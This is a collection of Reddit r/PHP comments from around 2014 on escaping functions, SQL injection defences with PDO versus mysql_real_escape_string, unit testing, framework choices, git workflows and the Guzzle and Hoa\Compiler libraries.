htmlentities will convert all characters with a valid html entity into their corresponding html entity (ie. &amp; =&gt; &amp;amp;). htmlspecialchars only does &amp;, &lt;, &gt;, ' (single quote) and " (double quote). urlencode() and rawurlencode() will convert alphanumeric chars (except -_.) into %XX where XX is the hex value of the character. The only difference is urlencode() will convert spaces to a +, rawurlencode() will not touch spaces. hth *ps. not too sure what you mean by htmlspecialchars() breaking on spaces, can you post an example?
Nice, another MTBer who writes PHP
Worked for Amazon, in the early years :-)
I just realised I forgot to vote on this. I was too busy cheering! I rejected the "?:" inclusion when it was added to PHP because it was nonesense. I'm very happy we've finally reached consensus and this is now in. Viva la PHP7 :-)
A couple of projects at my place are gaining scale (Can't put names on anything yet, annoyingly) that are built on Laravel, although we mainly use it as glue rather than using it for everything. It seems to cope with the strain alright, any specific questions?
backbone &amp; underscore.
Why bother though? Parameterized = safe, escape_string = safe if you do x and y and jump through z. It's not like it's hard to prepare/execute.
Yep that's true (was only answering /u/myrealnameisbagels question).
There's a few things you can do. First, you seem to have abstracted a couple of areas: * Fetch from dB * pass into template * accept from form if valid * pass into dB You should look to isolate those functions and unit test with mocks. For example, create a mock database object and make sure the right methods are called with the right parameters for a given call to fetch_from_db. Beyond that you could use functional tests on the back end to test the system including code and database. For this you would usually run a fixtures script to set the database up in a known state, then call your methods that interact with the db (without mocks) and verify the results. You could also add functional tests to the full system (assuming it's a web site) with something like casperjs, or selenium. Again, you would be best to run a fixtures script to put things into a known sate before running any tests. I would recommend using a full stack framework, no matter how small your site (performance is truly negligible), and learning how the community approaches these problems. They are important problems, and not alsways easy to solve. 
`mysql_real_escape_string()` is not a necessarily bad solution. It's just that there are better solutions. If you forget to escape something, somewhere, between your hundreds of queries to the database, you're doomed. PDO and/or parametrized queries avoid that, automatically (when used correctly) and you don't have to worry. 
I created a manual system. Look at the spam created, create a point system. For example I kept getting my database spammed and filled up with shit. A lot of it would have '.ru' emails in the field. They would also have the same name. Often have the wrong formatting on some of the fields. I didnt want to use any of those CAPTCHA's as they annoy me as a user. By creating a point system, giving certain points per suspected spam activity... So in my case it was 1.5 points for a '.ru' email. 2 points for bad formatting on the forms. If they got over 5 points it wouldn't write anything.
Looks like there's a bot posting these now, it's sticky at the top of /r/php and has been there for 9 hours: http://www.reddit.com/r/PHP/comments/2hqrxn/php_moronic_monday_29092014/
I would return an object as that allows for more scope later to do things like $data-&gt;first(10); without breaking backwards compatibility. That and I find it easier to read $data-&gt;some_var 
I've never done unit testing. Ever. I work on a big project for my company and they've never been interested in doing it, but I'd like to make an effort to get our big ass custom CMS covered by tests. Where do I start? I've tried phptherightway and a couple of other places but they all seem to assume you're some unit testing genuis.
I know maybe this is irrelevant for the question, but I have to say it: use a library to deal with db (doctrine, illuminate etc.), no matter the size of the project. The overhead is minimal and the gains in legibility and maintainability are huge. Using SQL for dealing with DB is as crazy as using only curl to deal with APIs.
&gt; WPCore &gt; A simple web service that allows WordPress users to create and manage collections of their favourite plugins, and then quickly install them on their WordPress website. LOL, why is this built with Laravel and not Wordpress?
Most of the projects you see built on Laravel right now are new projects/sites. Not a lot of existing 'big' projects would be willing to do a complete rewrite 'just' to use Laravel for the sake of it.
Because even Wordpress wouldn't build anything on Wordpress.
/u/utotwel has been on a role with implementing features that make sense lately. Maybe he will take up this one? I like the concept behind simplemongophp, but it is a bit out of date code wise. Object persistence would be really nice in laravel. It wouldn't replace the existing ORM, but would give developers a choice based on what was right for their application. 
Unit testing is much simpler than that. I will give you some exampes once I get home and use my pc. But, basically you just create a test to make sure your cms works as intended. So, when you modify/change your cms in the future, you can run these tests to make sure all test is passing as expected 
It should be an obect ... a [Data Transfer Object](http://en.wikipedia.org/wiki/Data_transfer_object)
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Data transfer object**](https://en.wikipedia.org/wiki/Data%20transfer%20object): [](#sfw) --- &gt;__Data transfer object__ (__DTO__) is an object that carries data between processes. The motivation for its use has to do with the fact that communication between processes is usually done resorting to remote interfaces (e.g. web services), where each call is an expensive operation. Because the majority of the cost of each call is related to the round-trip time between the client and the server, one way of reducing the number of calls is to use an object (the DTO) that aggregates the data that would have been transferred by the several calls, but that is served by one call only. &gt; --- ^Interesting: [^Data ^access ^object](https://en.wikipedia.org/wiki/Data_access_object) ^| [^Plain ^old ^data ^structure](https://en.wikipedia.org/wiki/Plain_old_data_structure) ^Parent ^commenter ^can [^toggle ^NSFW](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+ckvgeil) ^or[](#or) [^delete](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+ckvgeil)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
Yup, I am the lead developer of Hoa ([Ivan Enderlin](http://mnt.io/)) :-). Also I am a fresh PhD, and `Hoa\Compiler` was a tool developed during my PhD thesis.
How does this perform compared to other approaches to parsing and lexing in PHP?
`mysql_real_escape_string` is known to be secure, if and only if: * You always use it and you always use it correctly. * You specify a connection charset through `mysql_set_charset` (and **not** in any other way - in particular not via a SET NAMES query or similar).
Whilst there is [`PHP-Parser`](https://github.com/nikic/PHP-Parser/) (;-)) which is a (manual) parser for PHP, no compiler-compiler exists in PHP so far. 1. Therefore, because this is a compiler-compiler, there is a [grammar description language (called PP)](http://hoa-project.net/En/Literature/Hack/Compiler.html#PP_language) and this is very useful for maintenance and development speed. For instance, here are two examples of grammars that are used daily by hundreds of users: in [`Hoa\Math`](https://github.com/hoaproject/Math) ([`Arithmetic.pp`](https://github.com/hoaproject/Math/blob/master/Arithmetic.pp)) or [`Hoa\Ruler`](https://github.com/hoaproject/Ruler) ([`Grammar.pp`](https://github.com/hoaproject/Ruler/blob/master/Grammar.pp)) (bonus: [JSON](https://github.com/hoaproject/Json/blob/master/Grammar.pp), which is very easy to read). New contributors can read and hack the compiler very easily. 2. The compiler is cut out in distinct layers: the lexer, the parser, the trace, the AST builder, nodes etc. Why? To ease hackability. The compiler has been designed to be hacked. And it works (see next point). 3. This library has been created during my PhD thesis, especially to solve the problem mentionned in this research article: [Grammar-based Testing using Realistic Domains in PHP](http://hoa-project.net/Fr/Literature/Research/Amost12.html). Consequently, [several **generation** algorithms](http://hoa-project.net/En/Literature/Hack/Compiler.html#Generation) land in this library. I am going to write articles on my blog to explain them and give examples in few days. Why is it interesting? Grammars and parsers are used to **validate** data, but we can use them to **generate** data, which is very useful in the context of test (e.g. test data generation) for example. You can generate payloads of JSON very easily according to different constraints (exhaustively, randomly —and uniformly—, by covering all the constructions in the grammar etc.), or you can generate tons of data for performance test and so on. Does it answer to your (large) question?
Github link is broken
Extending this is not the best pratice. PDO is a complete set of resources to handle databases and if you need add some behavior on it, probably is because you include some business necessity on it. That's why composing with PDO as a injected resource is the best pratice. When you extend this you add a not necessary layer on top of it. In other hand, when make composition with it, you can handle your necessities without this problem. which kind of behavior you need add to PDO you just simple can do without extending? 
Thanks for all the hard work team. It looks solid. Sure took a long time to get here but I am sure it is going to last a few years, just like 1.x releases.
All the talks/presentations/writeups I've read on big PHP projects have been using Symfony 2, so I'll be comparing to that. - Large, important projects will have experienced developers, Laravel is more aimed at people who want rapid prototyping or people new to OOP. - A lot of things are tightly coupled and/or hard-coded into the framework, making replacement/extension of core classes difficult and/or easy to break on updates. - Critical bugfixes/security fixes are not backported to previous minor versions, and at the same time it's difficult to upgrade large projects because minor version releases do not even try to be backwards compatible. - Laravel is effectively a 1-man project with poor issue and pull request management whereas you'll usually get a reply from one of the many maintainers of Symfony within a day or two. - Lack of feature planning and feature freezes, no semantic versioning (this could change in the future) and no long-term nor commercial support if needed.
Yes he is... same name for github and reddit account... obvious?
Quoting Rasmus: &gt; All the source and binary releases along with git is safe. &gt; &gt; And there was no new breach here. It was a box that wasn't properly cleaned up from the previous one and wasn't put behind the ssh bouncer like all the other machines.
If... you use an ASCII compatible character set in both your PHP code and for the MySQL connection which is almost guaranteed to be the case &lt;- except if you're in Asia where you might not be using an ASCII compatible connection in MySQL &lt;- in which case that is bad practice anyway Then as long as you put surround you mysql_real_escape_string() escaped strings with apostrophes in your SQL string, or case them to integers if you are expecting those, then you are safe, regardless of what everyone says. But you want to use PDO and prepared statements anyway simply because it's nicer to let it format the string for you than manually having to escape each varying part of the SQL string and concatenating them by yourself or using sprintf(). 
I don't think developers care about noscript users, to be honest. In this day and age, I don't expect them to either.
&gt; se a shorcut to select words, and using this shortcut multiple times, selects wider, logical part of code/html. It's so easy to copy entire div like this, t Short cut to select words? Do you mean the windows Ctrl + Shift + Left or Right buttons?
What this has to do with PHP exactly?
You want to escape html special characters in html. You want to escape segments of a URL with url escaping (rawurlencode()). You want to escape segments of a URL in HTML by first url escaping the segments, then html escaping the entire URL You don't want to escape in plain text. You want to mysql escape when using a dynamic string between quotes with mysql_escape_string(). Snippets of HTML that you know should actually be resolved to HTML in your HTML (e.g. blog's authors using an HTML WYDIWYG editor for articles), you don't want to escape at all in HTML. If you want to save a long string of HTML within a &lt;script&gt; tag to save to a variable (HTML that you would otherwise want to escape if you'd want to insert it directly into the HTML), you should json_encode() escape it WITHOUT html escaping it. This is because what if you then wanted to further do something other than inserting it into the HTML in your JavaScript code? What if you wanted to the above AND insert the same HTML into the HTML as well? You json_encode() encode the contents of the variable for JavaScript, and htmlspecialchars() escape it for HTML. So basically you should try to leave escaping to "the last moment" to allow for contexts to vary. And plus with this you wouldn't have to unescape then escape to something different if the end context would be different than you first expected.
I should've mentioned in the original post that the application is written in PHP. I didn't want to post to /r/programming in case there was a PHP-specific model that I could implement.
Why is it better to have an composed object that has this: function deleteFromTable($tableName, $condition) { // construct $statement here $this-&gt;pdo-&gt;query($statement); } vs an exnteded object that has this function deleteFromTable($tableName, $condition) { // construct $statement here $this-&gt;query($statement); } ? Assuming there's an answer that justifies the first option if you were to implement a DB abstraction class (think mysqli) that you need for your app would you go the same away about implementing this feature (ie: the deleteFromTable method)? I mean would you compose a DBConn class (to handle only basic querying) and use that as an injected resource for a DBExtra (to do the extra methods) or would you just put everything in one class?
One thing that I've done a lot of in the past: Adding functions that can build and prepare some of the more-common queries from associative arrays. 
I don't think you understand that model, it's not explaining how you host all your branches within different folders/urls, it's explaining how you branch a feature away from your trunk and merge it back in later. It basically means you branch from trunk (probably develop), do your work, then merge said branch into trunk again, something like this: * git checkout develop * git pull origin develop * git checkout -b myFeatureBranch * git commit -am "did some changes" * git checkout develop * git merge myFeatureBranch * git push origin develop Where you actually do your work is immaterial, though I'm not sure vagrant actually requires you to have admin to your own boxes to run and thus would suggest doing it locally, and if it does require admin, kick up a fuss, IT policies shouldn't get in the way of you doing your job.
&gt;I know if I play around with a language for more than a few hours then I'll become better at it So give it more than a few hours. It's a new tool, of course it'll have a learning curve. 
I understand the concept of branching, but the problem is with sharing one dev server. The good news is that my company allows us to install VirtualBox on our laptops (you just have to get someone from IT to install it for you). I'm experimenting with the development VM setup right now.
So typically you would have a 'bare' repo on the server. git init --bare All your devs would clone this repo for initial setup, which creates a non-bare repo on their machine (or their vagrant vm etc). Your devs then create local feature branches, merge those into their local master, and then push to the bare repository. They can also push features branches to remote, so other devs can pull them To manage access to this bare repo, look into gitolite which allows git to push/pull over ssh. The server repo is 'bare' because its a repo and nothing more. Unlike the repo's you all work on, it doesn't have a working copy/directory
Oh, just give everyone an SSH account. Your IT dept sounds precious. :p 
try a new PHP framework and you'll get the same feeling learning a new language is even worse because you don't even have the "muscle memory" for the most common tasks the only way I learn new things is forcing me to implement something big or making a real world application, just "testing" doesn't cut it (I'm a lazy bastard so I need an objetive - and find the easiest path to get there) 
Small correction: Dart is a language that will run on the Dart VM, which means it can run on the server or client, and can be cross-compiled to JavaScript. I have no interest in client-side programming at all, but have used a tiny bit of Dart on the server side and found it very enjoyable. If you haven't looked at it because it is a 'client-side language' you should look again. 
Any idea when the promised post-mortem from the previous breach will be published?
Why do you need virtual machines to do this? I mean you could...but why can't you just have everyone develop in their own sandbox/home folder on the dev machine and create branches as needed? What about branching requires multiple machines? I'm missing the problem here.
Has anyone attempted to write units test retroactively? I spent the last 9 months writing a rather large project in symfony and will be launching it soon. I at some point want to write tests for it so as the project grows in the future, It's easier for me to add new features and not have to worry about manually testing
This is embarrassing, but [here is](https://gist.github.com/bivoc/c6fd1f4d54bf8377e75c) my attempt to write an ORM for a basic CRUD operations. I would like to know, based on this trial, if I should invest some time and take it a little further. 
The need to encode &lt; &gt; &amp; is obvious, but I've always wondered if it is really necessary to escape the rest in these Unicode days? &amp;amp;copy;, &amp;amp;ldquo;, &amp;amp;deg;, and other such entities were nice shortcuts when hand coding, and necessary when working in a Latin character set, but seem unnecessary in today's world where UTF-8 is a de facto minimum standard and every browser handles it just fine. 
Please shoot me a note when you update this, or respond to the OP...I'd like to know as well. I kind of understand the idea, but have no idea what things to actually test. 
Why is there so much hate on Yii? Everywhere I turn, people are putting it down, but then framework review and ranking sites frequently put it near or at the top. A year ago, I spent a week each trying to understand and learn to use Symfony 2, Yii, CodeIgniter, Laravel, and a couple of others, and in the end Yii 1.1 was the only framework that 'made sense' to me (although I admit I liked the Eloquent ORM far better than Yii's). I was able to build a functional groundwork quite rapidly with Yii 1.1. 
For the html entities thing. function henc($s) { return htmlspecialchars($s, ENT_QUOTES, "UTF-8"); } function hdec($s) { return html_entity_decode($s, ENT_QUOTES, "UTF-8"); } These two functions to encode and decode have never let me down. Edit: I guess I should clarify, the first will only encode what is necessary to not break your html. This also assumes your document is being served as UTF-8 so copyright symbols and what not won't break. The second will decode all entities, so should you except user input or something, you can be sure those entities will get decoded.
Follows on from http://www.reddit.com/r/PHP/comments/2hohxc/php_deterministic_finite_automata
As an aside, if anyone finds this interesting and enjoys lexical analysis and parsing as a whole, check out [Ragel](http://www.complang.org/ragel/). It's a state machine language that compiles natively to other languages (such as C, C#, Go, etc). I used it last year to create a parser for realtime Bluetooth data on an ARM chip - it is extremely powerful! Unfortunately, it doesn't have an option to compile to PHP. Just thought it might be interesting for anyone who enjoys this kind of stuff however. 
I'm a beginner, and I'm curious: How do people get data into a mysql database in the "real world?" All of the tutorials I've followed start with creating a database, table, and a few records and proceed to manipulating the data. I have an excel file with 1,400 rows and 20 columns. I've tried using all of the import options within phpMyAdmin (csv, zipped csv, etc.) but I always seem to get errors. Sorry for not being specific about which errors, but any general feedback is appreciated. 
You must change your Bash and PHP scripts. And nowadays it's normal for URL paths to not be supported by projects. In which case you should allow for all subdomains to point to the same IP and make subdomain based virtualhosts pointing to different project folders. Everyone working on the same development project folder is simply unacceptable.
Why the backwards slash in the title? Some sort of Microsoft fanboi thing?
This is normal and good. This means you are leaving your comfort zone, and actually learning things. Keep at it with each stack you are interested in, and in some time you will get that AHA moment and everything will click. 
It depends how you define "their element". It's normal to experience some cognitive dissonance when you pick up something new. None of us are born with innate knowledge of these languages, frameworks, libraries, and APIs. The older I get, the more I'm convinced what separates a productive programmer who ostensibly understands everything vs. a forever n00b who never progresses ... is sheer perseverance, not IQ. Behind every person who seemingly knows his stuff forwards and backwards, there were hours and hours of reading, studying, and experimentation. If you're willing to put in that effort, too, you can also be one of the people who make everything seem easy.
Paul M. Jones (/u/pmjones) has written a book called [Modernizing Legacy PHP Applications](http://mlaphp.com/) that contains a good primer. It's not a free book, but I don't know about any free testing introductions (not saying they don't exist, just saying I don't know of any). Also, perhaps it's a good fit for what you're trying to do: it sounds like you're sort of revamping and rebuffing your old CMS.
TIL nothing is safe. :( Well, actually TIL to just always use UTF8 and PDO.
A shared dev server is a horrible idea, and not one you should be using, as it completely breaks a ton of basic needs that git and other services expect developers to have. You need local VMs, otherwise git branching isn't practical or useful at all. How do you guys even handle who commits what code?
Well, [here is](https://github.com/bivoc/bulletproof/blob/master/test/bulletproofTest.php) one super newbie-friendly example. It does not need any description, as its simplicity does that by itself. But, I will keep on anyway :) First you can see, the bulletProofTest class extends the PHPUnit_Framework_TestCase{} class. class bulletproofTest extends \PHPUnit_Framework_TestCase{} Which is required, if we want to access all methods that are used for testing. Which I will come to later. The whole purpose of unit testing is, to create something that works, then test it first. So, in this case, I built the [BuleltProof](https://github.com/bivoc/bulletproof/tree/master/src) class, in it, you can see there are a couple of methods, that without which the class can not function at all. So, let's say, If I was to remove one method or even rename it, then the class would not work. So, what can I do to avoid myself/or another person from doing that in the future? *I write test for it*. But how? Well, basically, in the class you can see two functions (methods). Their name (may look ridiculously long, but should describe what the test does) describe their purpose word for word. In this example, the first method public function test_if_all_visible_class_methods_exist() Instantiates the bulletproof class, gets all the class methods. $classMethod = get_class_methods($imageUploader); Second, I am comparing if this class, contains all the methods I have manually described. $result = array_diff( array( 'fileTypes', 'limitSize', 'limitDimension', 'uploadDir', 'watermark', 'shrink', 'crop', 'change', 'deleteFile', 'upload', ), $classMethod); The `array_diff()` function returns the difference b/n two arrays. That means, if any of those function are not found in the $classMethod it would return that function name. Why? Because, as I said, those methods need to exist in-order for the class to work. So, the actual test gets carried out by the methods we are provided in the PHPUnit_Framework_TestCase. (The class that we are extending). In this case, I used the assertTrue() methods. Which as its name, does nothing more than test a variable passed through the parameter, if it is *true*! $this-&gt;assertTrue(empty($result)); So, what happened now? The above method will check if empty($result) is true. Which should give a true value, because array_diff does not return anything, since all methods exists. But, if someone was to alter the class and maybe remove the crop() method, then assertTrue() would return false. because, $result hold 'crop', which is not empty and we would know, what went wrong. On the scale of 1-10, this is probably 1, as the most trivial use case of UnitTesting, but you get the overall point of testing this way, much faster than other tutorials. and checks if this class still has all the methods that were first declared. This comes in handy, if your application can break when you remove any of the methods. 
These are escaped mostly for other contexts than HTML itself. Also, just because everything supports UTF-8, doesn't mean everyone uses it. Also, if you use XHTML, the parser requires these character sequences to be escaped to be parsed.
Thanks a bunch! That's actually where my mind was headed. It's good hear it seconded. 
I know about the decision to use the escape character in namespaces which was a horrific decision that goes against 40+ years of tradition with C and related languages, but we don't have to carryover that horrific decision to other places.
I'm currently mid building a helpdesk, whereby people login, and can submit a ticket, and a higher level account can respond to the ticket, and change the status. I'm looking for just general advice, i'm using sessions to keep certain pages viewable to only the admin accounts. I've listed the resources below I'm using, if anyone has had experience with either in the past any insight would be great. https://github.com/ezSQL/ezSQL https://github.com/panique/php-login-minimal/ Also I'm not really looking to build this on a framework, I've looked into and had laravel installed and decided I'd rather start from scratch on my first version of this.
He just referenced the package name in the title. What's your problem. 
&gt; Does it answer to your (large) question? Not exactly... I meant "perform" in the sense of "runtime performance". I.e. how fast will lexers and parsers implemented using this library be? Personally I'm using [Phlexy](https://github.com/nikic/Phlexy) for lexers and [kmyacc](https://github.com/moriyoshi/kmyacc-forked) for parsers. I know that these do not directly compare to your library - e.g. kmyacc is just a standard LALR(1) generator whereas you use LL(k) - but it would still be interesting if you have any numbers for compatible grammars.
Both of those libraries look downright awful and probably full of security holes. The fact that you can't judge what libraries are safe/good to use and not is more of an indication that you *should* be using a framework. If not a full-stack framework, at least something like Silex or Slim, maybe in combination with an ORM like Doctrine, or just by using PDO.
Nothing is preventing you from writing unit tests retroactively, but the nice thing about unit testing is it reveals flaws in your code if your code is hard to test. If you detect these flaws early on (by writing unit tests before or while writing the actual code), these flaws are easy to fix. If you try to fix fundamental design flaws 9 months down the line... That's far more difficult. Basically, by putting off writing tests, you're accumulating technical debt, and it's only going to get worse the longer you wait.
"Fair wages for fair work" sounds a lot like "low wages for lots of work" to me.
yes, that's right. But, I am not sure if I should invest more time to it. The code sucks very much but I could improve it faster than it takes for me to learn propel, doctrine or redbean. And considering I only need it for basic crud. what do you think?
It's better because it allows you to _compose_ the class behaviour ``` function deleteFromTable($tableName, $condition) { // construct $statement here $this-&gt;cache-&gt;query($statement); $this-&gt;pdo-&gt;query($statement); } ```
Yup certainly. Just wanting to know for learning purposes
you want to subclass only if you class will be used thru the `PDO` interface, that is, to pass the object for others to use as it were a mere `PDO` instance, having those no knowledge of your concrete implementation. Otherwise, composition should be prefered 
Yeah dart:io, which powers the server-side usefulness bits, has gotten a lot of love recently. Not that long ago they didn't even have support for udp.
You're just going to learn a lot of bad habits. You're not in a position to write a library like this until you've used, read and understood large parts of popular existing libraries.
Yeah, that makes a lot of sense. It's just too freaking hard to learn how most orms work behind the scene. You have all these design patterns, and files ... I will just take another look at propel. I think its much smaller 
In term of runtime performance, I don't know. A benchmark will be interesting. The lexer is quite fast since we have optimized it in term of memory and CPU recently with other hackers (with `xhprof` &amp; co.). The parser is fast enough to handle thousands of “queries” per minute (stats from our “bigger” user). There is probably faster parser out there but maybe they are not as much hackable as `Hoa\Compiler`. However, with serialization and some tricks, you can have a very fast parser. In addition, the compiler is written by the user, so it depends a lot, but you know that. `kmyacc` is a C implementation, which is certainly faster than `Hoa\Compiler` that is implemented in PHP. Note: benchmarking lexers is a tedious task since it depends of the nature/kind of tokens, the length of the data, the repetition of tokens inside the data and also the repartition of these tokens inside the data. Each one of these parameters can change the result of benchmarks, but this will definitively be interesting!
This is a dramatic change to how exceptions work. I think it's better to keep the guarantee that catches will only execute once and that throws will return (with the exception of finally). This works best for the vast majority of exception cases. The case you describe (completed but with warnings) is not an exception and can be handled more conventionally, i.e., in the return: class TweetsReturn { protected $notices = array(); protected $tweets = array(); // adders/getters/setters for members... } /** * Gets tweets and any notices/warnings from service. * * @return TweetsReturn */ function getTweets() { $return = new TweetsReturn(); if (!$desirableCondition) { $return-&gt;addNotice('Something went wrong.'); doSomethingToCompensate(); } return $return; }
Hope you don't mind me tacking on another question but you seem pretty familiar with testing practices: Do you write functional and unit tests side by side? Functional first and then unit tests after getting the functional tests to just barely pass? I've been writing just functional ones so far and now I'm not sure how to work unit tests into the process but I'd really like to get them in there...
Of all the ones you tried, I think Ruby on Rails would make the most sense to you. Shame you got to it once you were burned out. I'm really not a fan myself, but a hell of a lot of people are, there's *tons* of resources for it, and adding a page is really simple. Stick at it and see where you end up. 
Hopefully lesson learned. Think about portability right from the start. It's not something you bolt on as a later afterthought. 
Would suggest you post this to /r/git for other answers to your workflow questions. As for the VMs - what about virtual hosts for each developer? Have worked this way in the past in a Windows based (and very locked down) corporate where we had a shared beefy server to SSH into and do our stuff.
Exploring other languages is great, but you shouldn't be too hard on yourself. Give it a time, take it as a game, don't force it. Perhaps you can find a tiny little project and try to bring it to life in a new language of choice. Also, don't bother to do things correctly, first familiarize yourself with a language, do something silly, do things wrongly, do things for fun, break things, and then learn best practices. :)
Not a single one of these things matters. They can all be googled in seconds.
Really? I'd like to see how you would entrust horizontally scaling your backend to someone who "googled it". a senior dev should have Experience in those things, not just know them
Easily the vast majority of stuff on that list can be googled. A senior dev should know how to write code that works in the present but can be easily extended in the future. They should be able to write clean code supported by excellent tests. They should be able to break up seemingly complicated problems into simple solutions without compromising future extensibility. In my opinion, any developer capable of doing all that is a senior dev. And good luck googling your way around all that. To do these things in practise takes years of skill and effort. Hence, senior dev.
What about knowing where to apply GRASP principles? Just googling them wont help you. It takes practice, just like SOLID does
Exactly! You shouldn't know all parts of an API, but you need to understand how to solve problems in programming in the most efficient way.
Facebook and Deviantart?
Oh its just a bulleted list of complicated terms and no actual information on what they are or why they are important. Its really cool how almost everything has no relevance to PHP. Great post OP! I really learned a lot.
I don't know of any new big sites that appeared in 2014 in any language. But you are actually just proving my point: A senior developer shouldn't be about the language, since its really easy to jump from one to another. It took me 3 hours to start coding a TCP socket server in Java, because the language doesn't matter, and its in fact the general networking knowledge that is important ins uch a task.
Treat it like a suggested reading list. A lot of people want to learn something new, but just don't know what. E.g. its hard to stumble across non-comparative sorting algorithms if you dont know what you're looking for. So here I present to you a list of interesting topics that should be useful for developers of certain levels at some point. I believe that googling and reading on one of those topics will be much more fruitful than reading a random blog on some basic OOP stuff
You must have overlooked [NW Seat Covers](https://www.nwseatcovers.com/en) on that list.
Someone posted [this video](https://www.youtube.com/watch?v=URSWYvyc42M) in another thread recently which I found useful. It's from a Ruby conference but the principles described are language agnostic.
/r/forhire Is a good subreddit to check out.
Here's the thing: PHP is an outlier. It was not designed like a programming language. It's made great strides towards adopting the standards and form of other programming languages, but it still has it's roots as a dynamic scripting environment for non-programmers. The weird feeling you're getting is learning to think more like a traditional programmer. For example: Where PHP can just throw anything in a variable and go, other languages require you to think about *what* that variable will be used for and how it should behave. The same with functions. Other languages just require more planning and forethought. I have a feeling that if you start with TDD or DDD and write tests/comments for your classes and functions ahead of time, you'll feel a lot better about other languages.
You can go further and use an interface for type hinting. This lets you pass different implementations of Request. Addon::getData only needs to know how to access the $request object.
I'm extremely excited about this, but hoped that the post would dive a little bit deeper into how the asynchronous requests are actually achieved in PHP. Facebook's `libphputil` includes a futures implementation that uses some tricky non-blocking switch to some of the socket functions, but that requires them to compose and handle the HTTP requests manually, which is sub-optimal and prone to bugs. What is the state of the art of asynchronous operations in PHP? **Edit** It looks like it's using the `curl_multi_*` family of functions. I didn't know that multi-requests are technically asynchronous. Very eager to test drive Guzzle as a sane and manageable interface to all of this quirkiness.
&gt; Masters + 2 years is required, with a Bachelors + 5 years alternately acceptable seriously?
&gt; At least 8 years successful technical development experience I think the web has changed a whole damn lot in eight years. I guess they're just really trying to hammer home the "Senior" part of the role hehe. 
I don't mind that requirement so much. while number of years itself isn't important, more years in an otherwise good developer is only beneficial.
Yeah in retrospect we should've coded it from the get go that way. There's over 300 files in our repository now. We may be able to do a quick rewrite of it, but that's unlikely. I'm still keeping the option available though. The VM route works, but it does require some code changes as well (not nearly as much).
I should add they're using Scrape Box and it's the same three IP addresses
Hi, we only allow remote-friendly positions here.
As someone who has always just used curl_multi, could you explain the value of something like Guzzle?
If nothing else, Guzzle is fun to type.
Cool, thanks!
My wife was looking over my shoulder as I read the article. She goes "Is that like, programmer porno?".
I love the curl_multi. I used it for creating a function to [thread downloads](https://gist.github.com/MattSandy/1113347a896cb3b6b0a0) a while back for a site I had, which fetched mp3s from bandcamp.com which capped transfer rates. 
The words asynchronous, concurrent, and parallel are *not* interchangeable.
Why are you writing to actual files? Seems like very bad practice to me. That is what databases are for after all. I can understand uploaded files like images or such, but just text?
What are you referring to? An error in the blog post or in code? What's happening in Guzzle is concurrency, and I state this in the blog post. The mention of parallelism in the blog post is referring to something I readily mention as a poor design decision (and yes, poorly named). I am also not claiming that asynchronous == concurrent (though to be fair, most asynchronous code is likely going to be run *concurrently* with other asynchronous code using some kind of non-blocking event loop). Furthermore, it's also technically possible, that someone could create an adapter that utilized threads (i.e., emulating how Clojure's futures actually work), making this a more complicated discussion. If only PHP had threads... just kidding, I know who you are :)
See vagrant it will solve all your problems.
Ok, hmmm. Functional testing, as I understand it so far, is writing tests for actions a user might do. For example, writing a test for adding an item to a shopping cart or a test for signing on with an account. So yea, that's what I mean when I say functional testing. Testing a process that occurs, I guess. I'm having a hard time trying to come up with a clearer or better question than the one I asked originally... I'll have to think a bit more about this. Thank you for your response and the info regardless though. I'll keep those points in mind. 
&gt; Lack of feature planning and feature freezes, no semantic versioning (this could change in the future) and no long-term nor commercial support if needed. Unless Taylor opens/builds up the team and/or commercializes the framework, i don't see this happening.
With all respect but this is BS dear sir. Could be true 10 years ago, but now it doesn't apply anymore. PHP has evolved a lot, in really good direction. Planning and forethought should be basic skill of every developer, no matter if using static/dynamic typing language.
&gt; You could use this new version of Guzzle using just the event system and never dereference futures This is exactly what I plan on doing, at least in the short term. &gt; using an as-of-yet-not-built adapter Looking forward to it :)
Suit yourself. I'm sure it will be riveting.
Wait.. Is this /r/shittyprogramming?
I'm working on production management framework where user is able to define parameters relevant to his industry and then write some expressions to evaluate these parameters based on some constants and order requirements. Mostly it's arithmetics + hooks to retrieve data from database, but the compiler also must provide correct context for the calculations. Currently we use LIME parser generator, but this looks very interesting. I will certainly have a look. Thanks for your work!
You can shorthand it: $x = (new Object)-&gt;method(); EDIT: But by the sounds of it, you're probably looking to create a static function there.
That's the traditional one, cold presence 
Nope, I mean save the return of the called method to the same variable which is at first, is the Object itself.
My understanding. Please correct me if I'm wrong. * concurrency: multiple methods being managed at the same time. I think this is what cooperative multi tasking does. * parallelism: multiple methods actually being executed at the same time. Requires threading. * asynchronous: decoupling calling a method and getting its response.
In my personal experience it is more down to what language family one is used to. While they may differ quite substantially sometimes, in the core idea, the syntax and especially semantics work the same across all of them. 90% I have been exposed to the C family (and the other 10% being BASIC and Pascal), so I can switch between C, C++, C#, Java, PHP, JavaScript, and even Perl (well, one of the dialects at least) without much problem (may take up to a week to get used to the relative standard libs though), but show me Python or Ruby and they just look wrong to me. After some fiddling I can read those, but am not confident I will do more than some minor hacks.
Can you give a simple, real world use case for this new operator? When would you use it and why? I don't think I've ever seen the need for something like this. Adding new features / operators to the language without good reason is a bad idea - it makes the language needlessly more complex, can make code harder to read when the feature / operator is used and adds technical debt to the maintenance of the language itself.
Finally someone stands up to say this!
Don't be anal, obviously you don't write bs commit messages in real life. :)
Like /u/ebonwumon said: abstraction. Guzzle has some great features when it comes to mocking responses so you don't have to hit third party API's in unit tests for example.
http://nvie.com/posts/a-successful-git-branching-model/
you want to overwrite the object itself with the return of a method? you have me confused here ... 
Hmm, did someone say asynchronous requests? Because I'm pretty sure that someone said asynchronous requests! https://github.com/amphp/artax 
